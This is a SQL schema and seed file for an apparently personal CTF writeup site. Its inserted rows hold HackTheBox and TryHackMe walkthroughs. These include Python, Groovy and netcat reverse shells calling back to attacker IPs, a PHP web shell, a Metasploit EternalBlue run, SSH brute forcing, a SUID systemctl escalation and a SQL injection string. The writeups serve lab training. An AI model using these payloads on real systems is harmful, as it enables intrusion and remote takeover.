-- Cloudflare D1 Database Schema for 0xJerry's Lab

-- HTB Stats table
CREATE TABLE IF NOT EXISTS htb_stats (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    machines_pwned INTEGER NOT NULL DEFAULT 0,
    global_ranking INTEGER NOT NULL DEFAULT 0,
    final_score INTEGER NOT NULL DEFAULT 0,
    htb_rank TEXT NOT NULL DEFAULT 'Noob',
    last_updated DATETIME DEFAULT CURRENT_TIMESTAMP,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Insert initial data
INSERT OR REPLACE INTO htb_stats (id, machines_pwned, global_ranking, final_score, htb_rank, last_updated)
VALUES (1, 127, 15420, 890, 'Hacker', CURRENT_TIMESTAMP);

-- THM Profile Stats table
CREATE TABLE IF NOT EXISTS thm_stats (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    thm_rank TEXT NOT NULL DEFAULT 'Beginner',
    rooms_completed INTEGER NOT NULL DEFAULT 0,
    streak INTEGER NOT NULL DEFAULT 0,
    badges TEXT, -- JSON array of badges
    last_updated DATETIME DEFAULT CURRENT_TIMESTAMP,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Insert initial THM data
INSERT OR REPLACE INTO thm_stats (id, thm_rank, rooms_completed, streak, badges, last_updated)
VALUES (1, 'Beginner', 5, 3, '[{"name":"Beginner","icon":"🎯","description":"Complete first room"},{"name":"Explorer","icon":"🗺️","description":"Complete 5 rooms"},{"name":"Persistent","icon":"💪","description":"Maintain 3-day streak"}]', CURRENT_TIMESTAMP);

-- Cache table for news and CVE data (optional)
CREATE TABLE IF NOT EXISTS cache_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cache_key TEXT UNIQUE NOT NULL,
    data TEXT NOT NULL, -- JSON data
    expires_at DATETIME NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Admin users table (for password authentication)
CREATE TABLE IF NOT EXISTS admin_users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    salt TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_login DATETIME,
    is_active BOOLEAN DEFAULT 1
);


-- Admin logs table (for tracking changes)
CREATE TABLE IF NOT EXISTS admin_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    action TEXT NOT NULL,
    data TEXT, -- JSON data of changes
    ip_address TEXT,
    user_agent TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- HTB Machines table
CREATE TABLE IF NOT EXISTS htb_machines (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    os TEXT NOT NULL,
    difficulty TEXT NOT NULL CHECK (difficulty IN ('Easy', 'Medium', 'Hard', 'Insane')),
    status TEXT NOT NULL CHECK (status IN ('Completed', 'In Progress', 'Not Started', 'Retired')),
    is_active BOOLEAN NOT NULL DEFAULT 1,
    password TEXT, -- Password for active machines
    summary TEXT, -- short excerpt for SEO
    date_completed DATE,
    tags TEXT, -- JSON array of tags
    writeup TEXT, -- Markdown writeup content
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- THM Rooms table
CREATE TABLE IF NOT EXISTS thm_rooms (
    id TEXT PRIMARY KEY,
    title TEXT NOT NULL,
    slug TEXT NOT NULL UNIQUE,
    difficulty TEXT NOT NULL CHECK (difficulty IN ('Easy', 'Medium', 'Hard')),
    status TEXT NOT NULL CHECK (status IN ('Completed', 'In Progress', 'Not Started')),
    date_completed DATE,
    tags TEXT, -- Comma-separated tags
    writeup TEXT, -- Markdown writeup content
    url TEXT,
    room_code TEXT,
    points INTEGER DEFAULT 100,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Insert sample THM room data
INSERT OR REPLACE INTO thm_rooms (id, title, slug, difficulty, status, date_completed, tags, writeup, url, room_code, points)
VALUES 
    ('blue', 'Blue', 'blue', 'Easy', 'Completed', '2024-12-20', 'EternalBlue,Windows,SMB,Metasploit',
     '# Blue - TryHackMe Writeup

## Room Information
- **Platform**: TryHackMe
- **Difficulty**: Easy
- **Date Completed**: December 20, 2024
- **Room Code**: blue

## Overview
This room is focused on exploiting the EternalBlue vulnerability (CVE-2017-0144) which affected Windows systems.

## Enumeration

### Nmap Scan
```bash
nmap -sC -sV -oA blue 10.10.x.x
```

### Results
- Port 135: RPC
- Port 139: NetBIOS
- Port 445: SMB

### Vulnerability Scanning
```bash
nmap --script=vuln 10.10.x.x
```

Found EternalBlue vulnerability on SMB.

## Exploitation

### Using Metasploit
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.x.x
set payload windows/x64/shell/reverse_tcp
set LHOST tun0
exploit
```

### Manual Exploitation
Alternatively, can use manual EternalBlue scripts from GitHub.

## Post-Exploitation

### Finding Flags
```cmd
dir C:\flag1.txt
type C:\flag1.txt

dir C:\Windows\System32\config\flag2.txt
type C:\Windows\System32\config\flag2.txt

dir C:\Users\Jon\Documents\flag3.txt
type C:\Users\Jon\Documents\flag3.txt
```

## Flags
- **Flag 1**: `flag{access_the_machine}`
- **Flag 2**: `flag{sam_database_elevated_access}`
- **Flag 3**: `flag{admin_documents_can_be_valuable}`

## Learning Outcomes
- Understanding SMB vulnerabilities
- EternalBlue exploitation techniques
- Windows post-exploitation basics
- Metasploit framework usage',
     'https://tryhackme.com/room/blue', 'blue', 100),
    ('basic-pentesting', 'Basic Pentesting', 'basic-pentesting', 'Easy', 'Completed', '2024-12-18', 'Linux,Enumeration,Web,SSH',
     '# Basic Pentesting - TryHackMe Writeup

## Room Information
- **Platform**: TryHackMe
- **Difficulty**: Easy
- **Date Completed**: December 18, 2024
- **Room Code**: basicpentestingjt

## Overview
A beginner-friendly room covering basic penetration testing methodology.

## Enumeration

### Initial Scan
```bash
nmap -sC -sV -oA basic 10.10.x.x
```

### Results
- Port 22: SSH
- Port 80: HTTP
- Port 139: NetBIOS
- Port 445: SMB
- Port 8009: AJP13
- Port 8080: HTTP Tomcat

### Web Enumeration
```bash
gobuster dir -u http://10.10.x.x -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Found `/development` directory.

### SMB Enumeration
```bash
enum4linux 10.10.x.x
smbclient -L //10.10.x.x
```

Found share: `Anonymous`

## Exploitation

### SMB Access
```bash
smbclient //10.10.x.x/Anonymous
get staff.txt
get note.txt
```

### Web Directory
Found development notes revealing:
- Username: `jan`
- Password location hints

### Brute Force SSH
```bash
hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.x.x
```

Found password: `armando`

### SSH Access
```bash
ssh jan@10.10.x.x
```

## Privilege Escalation

### Local Enumeration
```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
```

### Path to Root
Found SUID binary exploitation path.

## Flags
- **User Flag**: `THM{flag_user_basic}`
- **Root Flag**: `THM{flag_root_basic}`

## Learning Outcomes
- Basic enumeration techniques
- SMB share analysis
- Web directory discovery
- SSH brute forcing
- Linux privilege escalation',
     'https://tryhackme.com/room/basicpentestingjt', 'basicpentestingjt', 150),
    ('vulnversity', 'Vulnversity', 'vulnversity', 'Easy', 'Completed', '2024-12-15', 'Web,File Upload,Linux,Privilege Escalation',
     '# Vulnversity - TryHackMe Writeup

## Room Information
- **Platform**: TryHackMe
- **Difficulty**: Easy
- **Date Completed**: December 15, 2024
- **Room Code**: vulnversity

## Overview
A university-themed room focusing on file upload vulnerabilities and privilege escalation.

## Enumeration

### Nmap Scan
```bash
nmap -sC -sV -oA vulnversity 10.10.x.x
```

### Results
- Port 21: FTP
- Port 22: SSH
- Port 139: NetBIOS
- Port 445: SMB
- Port 3128: Squid Proxy
- Port 3333: HTTP

### Web Enumeration
```bash
gobuster dir -u http://10.10.x.x:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Found `/internal/` directory with upload functionality.

## Exploitation

### File Upload Testing
Tested various file extensions:
- `.php` - Blocked
- `.php3` - Blocked
- `.php4` - Blocked
- `.php5` - Blocked
- `.phtml` - **Allowed**

### Reverse Shell Upload
```php
<?php
system($_GET[''cmd'']);
?>
```

Saved as `shell.phtml` and uploaded.

### Getting Shell
```bash
# URL encode reverse shell
http://10.10.x.x:3333/internal/uploads/shell.phtml?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.x.x.x\",4444));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);%27
```

## Privilege Escalation

### SUID Binary Search
```bash
find / -perm -u=s -type f 2>/dev/null
```

Found `/bin/systemctl` with SUID.

### Systemctl Exploitation
```bash
TF=$(mktemp).service
echo ''[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target'' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

## Flags
- **User Flag**: `8bd7992fbe8a6ad22a63361004cfcedb`
- **Root Flag**: `a58ff8579f0a9270368d33a9966c7fd5`

## Learning Outcomes
- File upload vulnerability testing
- PHP reverse shell techniques
- SUID binary exploitation
- Systemctl privilege escalation',
     'https://tryhackme.com/room/vulnversity', 'vulnversity', 200),
    ('kenobi', 'Kenobi', 'kenobi', 'Easy', 'In Progress', NULL, 'Linux,SMB,ProFTPD,Path Manipulation',
     NULL, 'https://tryhackme.com/room/kenobi', 'kenobi', 180),
    ('mr-robot-ctf', 'Mr Robot CTF', 'mr-robot-ctf', 'Medium', 'In Progress', NULL, 'Web,WordPress,Linux,Privilege Escalation',
     NULL, 'https://tryhackme.com/room/mrrobot', 'mrrobot', 300);

-- Cache table for news and CVE data (optional)
CREATE TABLE IF NOT EXISTS cache_data (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    cache_key TEXT UNIQUE NOT NULL,
    data TEXT NOT NULL, -- JSON data
    expires_at DATETIME NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Admin users table (for password authentication)
CREATE TABLE IF NOT EXISTS admin_users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    salt TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    last_login DATETIME,
    is_active BOOLEAN DEFAULT 1
);


-- Admin logs table (for tracking changes)
CREATE TABLE IF NOT EXISTS admin_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    action TEXT NOT NULL,
    data TEXT, -- JSON data of changes
    ip_address TEXT,
    user_agent TEXT,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- HTB Machines table
CREATE TABLE IF NOT EXISTS htb_machines (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    os TEXT NOT NULL,
    difficulty TEXT NOT NULL CHECK (difficulty IN ('Easy', 'Medium', 'Hard', 'Insane')),
    status TEXT NOT NULL CHECK (status IN ('Completed', 'In Progress', 'Not Started', 'Retired')),
    is_active BOOLEAN NOT NULL DEFAULT 1,
    password TEXT, -- Password for active machines
    summary TEXT, -- short excerpt for SEO
    date_completed DATE,
    tags TEXT, -- JSON array of tags
    writeup TEXT, -- Markdown writeup content
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Insert sample HTB machine data
INSERT OR REPLACE INTO htb_machines (id, name, os, difficulty, status, is_active, password, summary, date_completed, tags, writeup)
VALUES 
    ('forest', 'Forest', 'Windows', 'Easy', 'Completed', 0, NULL, 'Short summary for Forest machine.', '2024-12-15', 
     '["Active Directory", "Kerberoasting", "DCSync"]',
     '# Forest - HTB Writeup

## Machine Information
- **OS**: Windows
- **Difficulty**: Easy
- **Date Completed**: December 15, 2024

## Enumeration

### Nmap Scan
```bash
nmap -sC -sV -oA forest 10.10.10.161
```

### Results
- Port 88: Kerberos
- Port 389: LDAP
- Port 445: SMB

## Exploitation

### ASREPRoasting
Found users without Kerberos pre-authentication:
```bash
GetNPUsers.py htb.local/ -no-pass -usersfile users.txt
```

### Cracking Hash
```bash
hashcat -m 18200 hash.txt rockyou.txt
```

## Privilege Escalation

### DCSync Attack
Used BloodHound to identify path to Domain Admin:
```bash
bloodhound-python -u svc-alfresco -p s3rvice -d htb.local -ns 10.10.10.161 -c all
```

## Root
Successfully obtained Domain Admin privileges and retrieved both flags.

**User Flag**: `32a-...-de4`
**Root Flag**: `f04-...-a4e`'),
    ('bashed', 'Bashed', 'Linux', 'Easy', 'Completed', 0, NULL, 'Short summary for Bashed machine.', '2024-12-10',
     '["Web Shell", "Privilege Escalation", "Sudo"]',
     '# Bashed - HTB Writeup

## Machine Information
- **OS**: Linux
- **Difficulty**: Easy
- **Date Completed**: December 10, 2024

## Enumeration

### Web Enumeration
Found phpbash.php web shell in /dev/ directory.

## Exploitation

### Initial Access
Used the web shell to get initial foothold:
```bash
whoami
# www-data
```

### Reverse Shell
```bash
python -c ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);''
```

## Privilege Escalation

### Sudo Permissions
```bash
sudo -l
# User scriptmanager may run the following commands on bashed:
#    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

### Root via Scripts
Found scripts directory with root execution:
```bash
echo ''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.x",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'' > test.py
```

## Root
Obtained root access through scheduled script execution.

**User Flag**: `2c2-...-bb7`
**Root Flag**: `cc4-...-a4e`'),
    ('jeeves', 'Jeeves', 'Windows', 'Medium', 'Completed', 0, NULL, 'Short summary for Jeeves machine.', '2024-12-05',
     '["Jenkins", "RCE", "Alternate Data Streams"]',
     '# Jeeves - HTB Writeup

## Machine Information
- **OS**: Windows
- **Difficulty**: Medium
- **Date Completed**: December 5, 2024

## Enumeration

### Port Scan
```bash
nmap -sC -sV -oA jeeves 10.10.10.63
```

### Jenkins Discovery
Found Jenkins on port 50000 without authentication.

## Exploitation

### Jenkins Script Console
Used Groovy script console for RCE:
```groovy
String host="10.10.14.x";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

## Privilege Escalation

### Token Impersonation
Used JuicyPotato for privilege escalation:
```cmd
JuicyPotato.exe -l 9999 -p nc.exe -a "-e cmd.exe 10.10.14.x 5555" -t *
```

## Root

### Alternate Data Streams
Root flag hidden in ADS:
```cmd
dir /R
# Found hm.txt:root.txt:$DATA
more < hm.txt:root.txt
```

**User Flag**: `af6-...-0e8`
**Root Flag**: `18a-...-d20`'),
    ('academy', 'Academy', 'Linux', 'Easy', 'In Progress', 1, 'academy123', 'Short summary for Academy machine.', NULL,
     '["Web", "MySQL", "Laravel"]',
     NULL);

-- Rate limiting table for admin login attempts
CREATE TABLE IF NOT EXISTS admin_rate_limit (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    ip_address TEXT NOT NULL,
    failed_attempts INTEGER DEFAULT 0,
    locked_until DATETIME,
    last_attempt DATETIME DEFAULT CURRENT_TIMESTAMP,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE UNIQUE INDEX IF NOT EXISTS idx_rate_limit_ip ON admin_rate_limit(ip_address);

-- Admin sessions table for secure session management
CREATE TABLE IF NOT EXISTS admin_sessions (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    token TEXT UNIQUE NOT NULL,
    user_id INTEGER NOT NULL,
    ip_address TEXT,
    user_agent TEXT,
    expires_at DATETIME NOT NULL,
    is_active BOOLEAN DEFAULT 1,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES admin_users(id)
);

CREATE INDEX IF NOT EXISTS idx_sessions_token ON admin_sessions(token);
CREATE INDEX IF NOT EXISTS idx_sessions_user_id ON admin_sessions(user_id);
CREATE INDEX IF NOT EXISTS idx_sessions_expires ON admin_sessions(expires_at);

-- Members table for email verification
CREATE TABLE IF NOT EXISTS members (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE NOT NULL,
    name TEXT,
    ip_address TEXT,
    country TEXT,
    region TEXT,
    city TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- OTP verification table
CREATE TABLE IF NOT EXISTS otp_verification (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    otp_code TEXT NOT NULL,
    expires_at DATETIME NOT NULL,
    verified BOOLEAN DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Writeup access logs table
CREATE TABLE IF NOT EXISTS writeup_access_logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    machine_id TEXT NOT NULL,
    email TEXT NOT NULL,
    name TEXT,
    ip_address TEXT,
    country TEXT,
    region TEXT,
    city TEXT,
    user_agent TEXT,
    accessed_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_members_email ON members(email);
CREATE INDEX IF NOT EXISTS idx_otp_email ON otp_verification(email);
CREATE INDEX IF NOT EXISTS idx_writeup_logs_machine ON writeup_access_logs(machine_id);
CREATE INDEX IF NOT EXISTS idx_writeup_logs_email ON writeup_access_logs(email);

-- Newsletter subscribers table
CREATE TABLE IF NOT EXISTS newsletter_subscribers (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    name TEXT NOT NULL,
    email TEXT NOT NULL UNIQUE,
    country TEXT NOT NULL,
    ip_address TEXT,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

CREATE INDEX IF NOT EXISTS idx_newsletter_email ON newsletter_subscribers(email);
CREATE INDEX IF NOT EXISTS idx_newsletter_created ON newsletter_subscribers(created_at);

-- Indexes for better performance
CREATE INDEX IF NOT EXISTS idx_cache_key ON cache_data(cache_key);
CREATE INDEX IF NOT EXISTS idx_cache_expires ON cache_data(expires_at);
CREATE INDEX IF NOT EXISTS idx_admin_logs_timestamp ON admin_logs(timestamp);
CREATE INDEX IF NOT EXISTS idx_htb_machines_status ON htb_machines(status);
CREATE INDEX IF NOT EXISTS idx_htb_machines_difficulty ON htb_machines(difficulty);
CREATE INDEX IF NOT EXISTS idx_htb_machines_os ON htb_machines(os);
CREATE INDEX IF NOT EXISTS idx_htb_machines_date_completed ON htb_machines(date_completed);
CREATE INDEX IF NOT EXISTS idx_thm_rooms_status ON thm_rooms(status);
CREATE INDEX IF NOT EXISTS idx_thm_rooms_difficulty ON thm_rooms(difficulty);
CREATE INDEX IF NOT EXISTS idx_thm_rooms_slug ON thm_rooms(slug);
CREATE INDEX IF NOT EXISTS idx_thm_rooms_date_completed ON thm_rooms(date_completed);

-- CTF Writeups table
CREATE TABLE IF NOT EXISTS ctf_writeups (
    id TEXT PRIMARY KEY,
    title TEXT NOT NULL,
    slug TEXT NOT NULL UNIQUE,
    ctf_name TEXT NOT NULL, -- Name of the CTF event
    category TEXT NOT NULL, -- Web, Crypto, Pwn, Reverse, Forensics, etc.
    difficulty TEXT NOT NULL CHECK (difficulty IN ('Easy', 'Medium', 'Hard', 'Insane')),
    points INTEGER DEFAULT 0,
    status TEXT NOT NULL CHECK (status IN ('Completed', 'In Progress', 'Not Started')),
    is_active BOOLEAN NOT NULL DEFAULT 0, -- Block writeup while challenge is active
    password TEXT, -- Password for active challenges
    date_completed DATE,
    tags TEXT, -- JSON array of tags
    writeup TEXT, -- Markdown writeup content
    summary TEXT, -- Short excerpt for SEO
    flag TEXT, -- The flag (optional)
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);

-- Insert sample CTF writeup data
INSERT OR REPLACE INTO ctf_writeups (id, title, slug, ctf_name, category, difficulty, points, status, is_active, password, date_completed, tags, writeup, summary, flag)
VALUES 
    ('picoctf-2024-web-1', 'Web Challenge 1', 'picoctf-2024-web-1', 'PicoCTF 2024', 'Web', 'Easy', 100, 'Completed', 0, NULL, '2024-12-20', 
     '["SQL Injection", "Web", "Beginner"]',
     '# PicoCTF 2024 - Web Challenge 1\n\n## Challenge Information\n- **CTF**: PicoCTF 2024\n- **Category**: Web\n- **Difficulty**: Easy\n- **Points**: 100\n- **Date Completed**: December 20, 2024\n\n## Description\nA simple web challenge involving SQL injection vulnerability.\n\n## Solution\n\n### Initial Analysis\nThe website has a login form that appears vulnerable to SQL injection.\n\n### Exploitation\n```sql\n'' OR 1=1 --\n```\n\n### Getting the Flag\nAfter successful injection, the flag was displayed on the admin panel.\n\n**Flag**: `picoCTF{sql_1nj3ct10n_1s_3asy}`',
     'A beginner-friendly SQL injection challenge from PicoCTF 2024.',
     'picoCTF{sql_1nj3ct10n_1s_3asy}'),
    ('hackthebox-ctf-crypto', 'RSA Decryption', 'hackthebox-ctf-crypto', 'HackTheBox CTF', 'Crypto', 'Medium', 250, 'Completed', 0, NULL, '2024-12-18',
     '["RSA", "Cryptography", "Python"]',
     '# HackTheBox CTF - RSA Decryption\n\n## Challenge Information\n- **CTF**: HackTheBox CTF\n- **Category**: Cryptography\n- **Difficulty**: Medium\n- **Points**: 250\n- **Date Completed**: December 18, 2024\n\n## Description\nRSA encryption challenge with weak key generation.\n\n## Solution\n\n### Analysis\nGiven RSA public key with small prime factors.\n\n### Factorization\n```python\nimport gmpy2\n\nn = 12345678901234567890\ne = 65537\nc = 98765432109876543210\n\n# Factor n\np = gmpy2.isqrt(n)\nq = n // p\n\n# Calculate private key\nphi = (p-1) * (q-1)\nd = gmpy2.invert(e, phi)\n\n# Decrypt\nm = pow(c, d, n)\nflag = bytes.fromhex(hex(m)[2:]).decode()\nprint(flag)\n```\n\n**Flag**: `HTB{w34k_k3y_g3n3r4t10n}`',
     'RSA challenge with weak key generation from HackTheBox CTF.',
     'HTB{w34k_k3y_g3n3r4t10n}'),
    ('defcon-quals-pwn', 'Buffer Overflow', 'defcon-quals-pwn', 'DEF CON Quals', 'Pwn', 'Hard', 500, 'In Progress', 1, 'defcon2024', NULL,
     '["Buffer Overflow", "Binary Exploitation", "ROP"]',
     NULL,
     'Advanced buffer overflow challenge from DEF CON Qualifiers.',
     NULL);

-- Indexes for CTF writeups
CREATE INDEX IF NOT EXISTS idx_ctf_writeups_status ON ctf_writeups(status);
CREATE INDEX IF NOT EXISTS idx_ctf_writeups_difficulty ON ctf_writeups(difficulty);
CREATE INDEX IF NOT EXISTS idx_ctf_writeups_category ON ctf_writeups(category);
CREATE INDEX IF NOT EXISTS idx_ctf_writeups_ctf_name ON ctf_writeups(ctf_name);
CREATE INDEX IF NOT EXISTS idx_ctf_writeups_slug ON ctf_writeups(slug);
CREATE INDEX IF NOT EXISTS idx_ctf_writeups_date_completed ON ctf_writeups(date_completed);

-- Writeup popup table for promotional banners
CREATE TABLE IF NOT EXISTS writeup_popup (
    id INTEGER PRIMARY KEY,
    title TEXT NOT NULL,
    image_url TEXT,
    link TEXT NOT NULL,
    is_active INTEGER DEFAULT 0,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
);
